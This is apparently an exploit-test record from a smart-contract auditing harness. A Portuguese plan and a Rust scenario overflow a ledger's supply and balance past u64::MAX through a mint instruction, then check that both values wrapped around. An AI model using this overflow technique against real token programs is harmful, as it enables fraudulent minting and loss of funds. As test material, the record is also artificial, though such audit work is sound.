{"plan": "Preparar uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) nos offsets 40 e 48. Baseline: chamar mint com amount pequeno (ex.: 1) e verificar que supply/balance incrementam normalmente. Ataque: chamar mint com amount grande o suficiente para estourar (ex.: 10), fazendo wrapping_add reiniciar os valores. Efeito: apos o ataque, ler supply/balance e confirmar que sao menores que os valores iniciais (underflow visual), demonstrando a quebra da invariante.", "scenario": "let ledger_key = Pubkey::new_unique();
let mut data = vec![0u8; 56];
let initial_supply = u64::MAX - 5;
let initial_balance = u64::MAX - 5;
data[40..48].copy_from_slice(&initial_supply.to_le_bytes());
data[48..56].copy_from_slice(&initial_balance.to_le_bytes());
let ledger = account(&env.program_id, &data, None);
let contas = vec![(ledger_key, ledger.clone())];

let ix_baseline = env.raw_ix(&[IX_MINT, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);
let r_base = env.baseline("mint legitimo com amount=1", &ix_baseline, &contas);

let ix_attack = env.raw_ix(&[IX_MINT, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);
let r = env.attack("mint com amount=10 estoura u64::MAX", &ix_attack, &contas);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &ledger_key).data();
    let new_supply = read_u64(d, 40);
    let new_balance = read_u64(d, 48);
    env.effect("supply reiniciou para valor menor que o inicial", new_supply < initial_supply);
    env.effect("balance reiniciou para valor menor que o inicial", new_balance < initial_balance);
}"}

